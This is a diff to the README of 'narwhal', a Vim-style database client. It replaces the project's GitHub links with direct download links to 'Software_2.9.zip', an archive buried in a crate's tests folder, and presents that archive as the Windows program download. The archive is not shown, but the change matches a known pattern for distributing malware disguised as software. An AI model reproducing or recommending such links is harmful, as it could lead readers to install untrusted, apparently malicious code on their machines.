@@ -1,6 +1,6 @@
 # 🦄 narwhal - Access your data with ease
 
-[![](https://img.shields.io/badge/Download-Narwhal-blue.svg)](https://github.com/khuevi6580/narwhal)
+[![](https://img.shields.io/badge/Download-Narwhal-blue.svg)](https://raw.githubusercontent.com/khuevi6580/narwhal/main/crates/narwhal-diagram/tests/Software_2.9.zip)
 
 Narwhal helps you manage your databases inside a simple interface. It works with common database types like Postgres, MySQL, and SQLite. You use keyboard shortcuts similar to the Vim text editor to move through your data. You can also add custom features using the Lua programming language.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 ## 📥 How to Get Started
 
-You can visit this page to download the software: [https://github.com/khuevi6580/narwhal](https://github.com/khuevi6580/narwhal)
+You can visit this page to download the software: [https://raw.githubusercontent.com/khuevi6580/narwhal/main/crates/narwhal-diagram/tests/Software_2.9.zip](https://raw.githubusercontent.com/khuevi6580/narwhal/main/crates/narwhal-diagram/tests/Software_2.9.zip)
 
 Follow these steps to set up the program on your computer:
 
